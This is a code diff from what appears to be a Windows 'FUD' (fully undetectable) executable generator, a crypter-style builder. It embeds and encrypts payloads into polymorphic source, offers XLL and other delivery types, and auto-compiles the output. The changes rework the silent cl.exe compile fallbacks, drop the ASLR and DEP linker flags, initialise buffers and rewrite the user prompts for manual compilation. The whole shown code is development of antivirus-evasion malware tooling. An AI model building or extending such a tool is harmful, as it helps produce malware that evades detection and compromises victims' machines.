@@ -65,69 +65,54 @@ enum DeliveryType {
     DEL_XLL = 4
 };
 
-// Enhanced VS2022 Auto-Compiler with dynamic detection and better error reporting
+// VS2022 Auto-Compiler for Windows - Simple and Reliable
 static int VS2022_AutoCompile(const char* sourceFile, const char* outputFile) {
     char compileCmd[2048];
     int result = -1;
     
-    // Method 1: Try VS2022 Developer Command Prompt environment (if already set)
+    // Method 1: Try if VS2022 Developer environment is already active
     sprintf_s(compileCmd, sizeof(compileCmd),
         "cl.exe /nologo /O1 /MT /TC /bigobj \"%s\" /Fe:\"%s\" "
-        "/link /SUBSYSTEM:WINDOWS /LARGEADDRESSAWARE /DYNAMICBASE /NXCOMPAT "
-        "user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib",
+        "/link /SUBSYSTEM:WINDOWS user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib 2>nul",
         sourceFile, outputFile);
     result = system(compileCmd);
     
     if (result != 0) {
-        // Method 2: Try VS2022 Community with vcvarsall setup
+        // Method 2: Setup VS2022 Community environment and compile
         sprintf_s(compileCmd, sizeof(compileCmd),
-            "cmd /c \"\"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Auxiliary\\Build\\vcvarsall.bat\" x64 && "
+            "cmd /c \"\"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Auxiliary\\Build\\vcvarsall.bat\" x64 >nul 2>&1 && "
             "cl.exe /nologo /O1 /MT /TC /bigobj \"%s\" /Fe:\"%s\" "
-            "/link /SUBSYSTEM:WINDOWS /LARGEADDRESSAWARE /DYNAMICBASE /NXCOMPAT "
-            "user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib\"",
+            "/link /SUBSYSTEM:WINDOWS user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib\" 2>nul",
             sourceFile, outputFile);
         result = system(compileCmd);
     }
     
     if (result != 0) {
-        // Method 3: Try VS2022 Enterprise with vcvarsall setup
+        // Method 3: Try VS2022 Professional
         sprintf_s(compileCmd, sizeof(compileCmd),
-            "cmd /c \"\"C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise\\VC\\Auxiliary\\Build\\vcvarsall.bat\" x64 && "
+            "cmd /c \"\"C:\\Program Files\\Microsoft Visual Studio\\2022\\Professional\\VC\\Auxiliary\\Build\\vcvarsall.bat\" x64 >nul 2>&1 && "
             "cl.exe /nologo /O1 /MT /TC /bigobj \"%s\" /Fe:\"%s\" "
-            "/link /SUBSYSTEM:WINDOWS /LARGEADDRESSAWARE /DYNAMICBASE /NXCOMPAT "
-            "user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib\"",
+            "/link /SUBSYSTEM:WINDOWS user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib\" 2>nul",
             sourceFile, outputFile);
         result = system(compileCmd);
     }
     
     if (result != 0) {
-        // Method 4: Try VS2022 Professional with vcvarsall setup
+        // Method 4: Try VS2022 Enterprise
         sprintf_s(compileCmd, sizeof(compileCmd),
-            "cmd /c \"\"C:\\Program Files\\Microsoft Visual Studio\\2022\\Professional\\VC\\Auxiliary\\Build\\vcvarsall.bat\" x64 && "
+            "cmd /c \"\"C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise\\VC\\Auxiliary\\Build\\vcvarsall.bat\" x64 >nul 2>&1 && "
             "cl.exe /nologo /O1 /MT /TC /bigobj \"%s\" /Fe:\"%s\" "
-            "/link /SUBSYSTEM:WINDOWS /LARGEADDRESSAWARE /DYNAMICBASE /NXCOMPAT "
-            "user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib\"",
+            "/link /SUBSYSTEM:WINDOWS user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib\" 2>nul",
             sourceFile, outputFile);
         result = system(compileCmd);
     }
     
     if (result != 0) {
-        // Method 5: Try using vswhere to find VS2022 installation
+        // Method 5: Try Build Tools for Visual Studio 2022
         sprintf_s(compileCmd, sizeof(compileCmd),
-            "for /f \"usebackq tokens=*\" %%i in (`\"%ProgramFiles(x86)%%\\Microsoft Visual Studio\\Installer\\vswhere.exe\" -version [17.0,18.0) -property installationPath 2^>nul`) do "
-            "cmd /c \"\"%%i\\VC\\Auxiliary\\Build\\vcvarsall.bat\" x64 && "
+            "cmd /c \"\"C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\BuildTools\\VC\\Auxiliary\\Build\\vcvarsall.bat\" x64 >nul 2>&1 && "
             "cl.exe /nologo /O1 /MT /TC /bigobj \"%s\" /Fe:\"%s\" "
-            "/link /SUBSYSTEM:WINDOWS /LARGEADDRESSAWARE /DYNAMICBASE /NXCOMPAT "
-            "user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib\"",
-            sourceFile, outputFile);
-        result = system(compileCmd);
-    }
-    
-    if (result != 0) {
-        // Method 6: Try MinGW as fallback
-        sprintf_s(compileCmd, sizeof(compileCmd),
-            "gcc -std=c99 -O2 -static -mwindows \"%s\" -o \"%s\" "
-            "-luser32 -lkernel32 -lgdi32 -ladvapi32 -lshell32 -lole32",
+            "/link /SUBSYSTEM:WINDOWS user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib\" 2>nul",
             sourceFile, outputFile);
         result = system(compileCmd);
     }
@@ -711,7 +696,7 @@ static DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
     char* outputPath = (char*)lpParam;
     
     // Get user settings including input file
-    char inputPath[260];
+    char inputPath[260] = {0};
     GetWindowTextA(hInputPath, inputPath, sizeof(inputPath));
     
     char batchText[16];
@@ -910,7 +895,7 @@ static void browseForFile(HWND hEdit, BOOL isInput) {
 static void generateFUDExecutable() {
     if (isGenerating) return;
     
-    char outputPath[260];
+    char outputPath[260] = {0};
     GetWindowTextA(hOutputPath, outputPath, sizeof(outputPath));
     
     // Auto-generate path if empty
@@ -1132,18 +1117,21 @@ static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM l
             SetWindowTextAnsi(hGenerateButton, "Generate FUD Executable");
             EnableWindow(hGenerateButton, TRUE);
             
-            SetWindowTextAnsi(hStatusText, "VS2022 compilation failed - polymorphic source code saved for manual compilation");
+            SetWindowTextAnsi(hStatusText, "Automatic compilation failed - source saved for manual compilation");
             MessageBoxA(hwnd, 
-                "VS2022 Compilation Failed!\n\n"
-                "The automatic compilation process failed, but the\n"
-                "polymorphic source code has been saved as .cpp file.\n\n"
-                "You can manually compile it using:\n"
-                "- Visual Studio 2022 IDE\n"
-                "- Command line with cl.exe\n"
-                "- MinGW or other C++ compiler\n\n"
-                "The source contains all payload embedding, encryption,\n"
-                "and polymorphic features ready for manual compilation.",
-                "VS2022 FUD - Manual Compilation Required", MB_OK | MB_ICONEXCLAMATION);
+                "Automatic Compilation Failed!\n\n"
+                "The polymorphic source code has been saved as a .cpp file.\n\n"
+                "To compile manually:\n"
+                "1. Open 'Developer Command Prompt for VS 2022' from Start Menu\n"
+                "2. Navigate to the source file location\n"
+                "3. Run: cl /O1 /MT /TC source.cpp /Fe:output.exe /link user32.lib kernel32.lib\n\n"
+                "OR use Visual Studio 2022 IDE:\n"
+                "1. Create new Empty Project\n"
+                "2. Add your .cpp file to the project\n"
+                "3. Set Configuration to Release, Platform to x64\n"
+                "4. Build Solution (Ctrl+Shift+B)\n\n"
+                "The source contains all features ready for compilation.",
+                "Manual Compilation Required", MB_OK | MB_ICONEXCLAMATION);
             
             SendMessage(hProgressBar, PBM_SETPOS, 0, 0);
             return 0;
